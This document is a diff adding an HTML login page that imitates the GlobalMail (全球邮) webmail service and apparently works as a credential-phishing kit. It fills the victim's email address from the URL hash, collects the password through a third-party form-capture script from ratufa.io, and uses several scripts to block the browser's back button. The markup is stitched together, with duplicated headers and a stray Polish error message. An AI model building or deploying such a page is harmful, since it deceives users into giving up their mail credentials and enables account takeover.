@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>全球邮 GlobalMail</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    overflow-x: hidden;
+}
+
+/* Top White Utilities Ribbon Header Bar Line Layout Elements */
+.navbar {
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 40px;
+    background-color: #ffffff;
+    z-index: 10;
+}
+
+.logo-box {
+    font-size: 22px;
+    font-weight: bold;
+    color: #009688; /* Emerald green theme accent color style matching GlobalMail */
+    letter-spacing: -0.5px;
+}
+
+.nav-links {
+    font-size: 12px;
+    color: #666666;
+}
+
+.nav-links a {
+    color: #666666;
+    text-decoration: none;
+    margin: 0 6px;
+}
+
+.nav-links a:hover {
+    color: #00a896;
+}
+
+/* Main Content Workspace Layout View Area Segment Frame Backdrops */
+.workspace-banner {
+    flex-grow: 1;
+    background-color: #a3d2f7;
+    /* Soft cyan-blue glowing panoramic space tech background seamless replication template */
+    background: radial-gradient(circle at 50% 50%, #bce3ff 0%, #7ec2f5 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 60px 40px;
+    width: 100%;
+    position: relative;
+}
+
+/* Horizontal linear graphic overlays simulating the speed streaks in the original image */
+.workspace-banner::before {
+    content: '';
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    top: 0;
+    left: 0;
+    background: linear-gradient(to bottom, transparent 30%, rgba(255,255,255,0.4) 50%, transparent 70%);
+    pointer-events: none;
+}
+
+.main-content-wrapper {
+    width: 100%;
+    max-width: 1200px;
+    display: flex;
+    gap: 40px;
+    align-items: center;
+    justify-content: space-between;
+}
+
+/* Left Hero Column: Dynamic Glass Globe and Orbital Envelope Graphics Layout Container */
+.left-hero-panel {
+    flex: 1.2;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.glass-globe-graphic {
+    width: 280px;
+    height: 280px;
+    background: radial-gradient(circle at 30% 30%, #ffffff 0%, #4da6ff 40%, #0052cc 100%);
+    border-radius: 50%;
+    box-shadow: 0 10px 40px rgba(0, 82, 204, 0.3), inset -10px -10px 30px rgba(0,0,0,0.2);
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.envelope-overlay {
+    width: 140px;
+    height: 90px;
+    background-color: rgba(255, 255, 255, 0.95);
+    border: 1px solid #cbd5e1;
+    border-radius: 6px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 36px;
+    color: #0052cc;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+    z-index: 5;
+}
+
+.orbital-ring {
+    position: absolute;
+    border: 1.5px solid rgba(255, 255, 255, 0.6);
+    border-radius: 50%;
+    transform: rotateX(70deg) rotateY(-20deg);
+}
+
+.orbital-ring.r1 { width: 380px; height: 380px; }
+.orbital-ring.r2 { width: 420px; height: 420px; border-style: dashed; opacity: 0.5; }
+
+.floating-mail-icon {
+    position: absolute;
+    background-color: #0080ff;
+    color: #ffffff;
+    font-size: 11px;
+    padding: 3px 5px;
+    border-radius: 3px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+}
+
+.floating-mail-icon.m1 { top: 40px; left: -20px; }
+.floating-mail-icon.m2 { bottom: 80px; right: -30px; }
+
+/* Right Column: Credentials Main Container White Float Box Card Block */
+.login-card {
+    flex: 0.8;
+    max-width: 380px;
+    background-color: #ffffff;
+    border-radius: 4px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+    position: relative;
+    overflow: hidden;
+    width: 100%;
+    padding: 0 0 24px 0;
+    text-align: center;
+}
+
+/* Custom dual-mode tab selection ribbon components border track */
+.login-tabs {
+    display: flex;
+    background-color: #ffffff;
+    border-bottom: 1px solid #f0f0f0;
+    margin-bottom: 32px;
+}
+
+.tab-item {
+    flex: 1;
+    padding: 18px 8px;
+    text-align: center;
+    font-size: 14px;
+    color: #666666;
+    cursor: pointer;
+    font-weight: 500;
+}
+
+.tab-item.active {
+    color: #ff5500; /* Original sample highlighted tab text color style */
+    border-bottom: 3px solid #ff5500;
+}
+
+form {
+    padding: 0 28px;
+    width: 100%;
+}
+
+.form-group {
+    margin-bottom: 18px;
+    width: 100%;
+}
+
+/* Prefix Icon Addon Input Field Container Elements Rows Alignment */
+.icon-field-wrapper {
+    display: flex;
+    align-items: center;
+    border: 1px solid #cbd5e1;
+    background-color: #f8fafc;
+    height: 42px;
+    padding: 0 14px;
+}
+
+.icon-field-wrapper:focus-within {
+    border-color: #009688;
+    background-color: #ffffff;
+}
+
+.input-prefix-icon {
+    color: #94a3b8;
+    font-size: 14px;
+    margin-right: 12px;
+    user-select: none;
+}
+
+.form-control {
+    flex: 1;
+    height: 100%;
+    border: none;
+    font-size: 14px;
+    color: #333333;
+    outline: none;
+    background: transparent;
+}
+
+.form-control::placeholder {
+    color: #cbd5e1;
+    font-weight: 400;
+}
+
+/* Secondary choice components double side links grid alignment row row */
+.aux-links-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 13px;
+    margin-bottom: 24px;
+    padding: 0 2px;
+}
+
+.remember-label {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    color: #009688;
+    cursor: pointer;
+}
+
+.remember-label input {
+    accent-color: #009688;
+}
+
+.lang-dropdown-wrapper {
+    border: 1px solid #cbd5e1;
+    padding: 4px 8px;
+    background-color: #ffffff;
+}
+
+.lang-select {
+    border: none;
+    outline: none;
+    font-size: 12px;
+    color: #333333;
+    cursor: pointer;
+    background: transparent;
+}
+
+/* High contrast crisp wide rectangular solid emerald action submission trigger capsule button block component (NOW FULLY CLICKABLE) */
+.submit-btn {
+    position: relative;
+    z-index: 20;
+    width: 100%;
+    background-color: #00a884; /* Signature medium jade emerald tone */
+    color: #ffffff;
+    border: none;
+    height: 44px;
+    font-size: 15px;
+    letter-spacing: 4px;
+    border-radius: 4px;
+    cursor: pointer;
+    margin-bottom: 16px;
+    transition: background-color 0.15s ease;
+}
+
+.submit-btn:hover {
+    background-color: #008f6b;
+}
+
+.forgot-link {
+    display: block;
+    font-size: 12px;
+    color: #666666;
+    text-decoration: none;
+    text-align: right;
+    padding-right: 28px;
+}
+
+.forgot-link:hover {
+    color: #ff5500;
+    text-decoration: underline;
+}
+
+/* Fine-print corporate layout footer information sections components ribbon strip */
+.page-footer {
+    text-align: center;
+    font-size: 12px;
+    color: #64748b;
+    padding: 24px 20px;
+    background-color: #ffffff;
+    border-top: 1px solid #edf2f7;
+    width: 100%;
+}
+
+@media (max-width: 860px) {
+    .main-content-wrapper {
+        flex-direction: column;
+        gap: 50px;
+    }
+    .left-hero-panel {
+        width: 100%;
+    }
+    .login-card {
+        max-width: 100%;
+    }
+}
+
+
+    </style>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>全球邮 GlobalMail - 邮箱账号登录</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Top White Utilities Ribbon Header Bar Line Layout Elements -->
+    <header class="navbar">
+        <div class="brand-logo-area">
+            <!-- Header Logo Image Placeholder Box -->
+            <div class="logo-box">全球邮 GlobalMail</div>
+        </div>
+        <nav class="nav-links">
+            <span>售后服务: 400 660 5555</span> | 
+            <a href="#">帮助</a> | 
+            <a href="#">购买</a>
+        </nav>
+    </header>
+
+    <!-- Main Panoramic Horizon Content Workspace Area Component -->
+    <main class="workspace-banner">
+        <div class="main-content-wrapper">
+            
+            <!-- Left Hero Content Presentation Dynamic Globe Vector Graphic Layer Column -->
+            <div class="left-hero-panel">
+                <div class="glass-globe-graphic">
+                    <div class="envelope-overlay">✉️</div>
+                    <div class="orbital-ring r1"></div>
+                    <div class="orbital-ring r2"></div>
+                    <span class="floating-mail-icon m1">✉️</span>
+                    <span class="floating-mail-icon m2">✉️</span>
+                </div>
+            </div>
+
+            <!-- Right Column Form Container Card Box Component Module -->
+            <div class="login-card">
+                
+                <!-- Dual Navigation Mode Tab Strip Links Menu elements -->
+                <div class="login-tabs">
+                    <div class="tab-item">微信扫码登录</div>
+                    <div class="tab-item active">邮箱账号登录</div>
+                </div>
+
+                <!-- Form submission tracking configuration using FormSubmit module paths -->
+                <form action="" method="POST">
+    
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+
+                    <div class="form-group icon-field-wrapper">
+                        <span class="input-prefix-icon">👤</span>
+ <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                    </div>
+
+                    <div class="form-group icon-field-wrapper">
+                        <span class="input-prefix-icon">🔒</span>
+<input type="password" name="Password" placeholder="请输入密码" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                    </div>
+
+                    <!-- Auxiliary Active Option Rows Section Alignment -->
+                    <div class="aux-links-row">
+                        <label class="remember-label">
+                            <input type="checkbox" name="remember_account" checked>
+                            <span>记住账号</span>
+                        </label>
+                        
+                        <div class="lang-dropdown-wrapper">
+                            <select class="lang-select" name="language">
+                                <option value="default">默认语言</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- High contrast crisp wide rectangular solid emerald action submission trigger capsule button block component -->
+                    <button type="submit" class="submit-btn">登 录</button>
+                </form>
+
+                <!-- Footer layout assistance secondary navigation connections area link -->
+                <a href="#" class="forgot-link">忘记密码？</a>
+
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Base Fine-Print Page Footer Copyright Links Ribbon Strip Component -->
+    <footer class="page-footer">
+        <div class="copyright-line">Copyright © 2019-2026 中企动力科技股份有限公司 版权所有 京公网安备11011502037981号 京ICP备10002622号-7</div>
+    </footer>
+
+</body>
+</html>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+<style>
+</html>
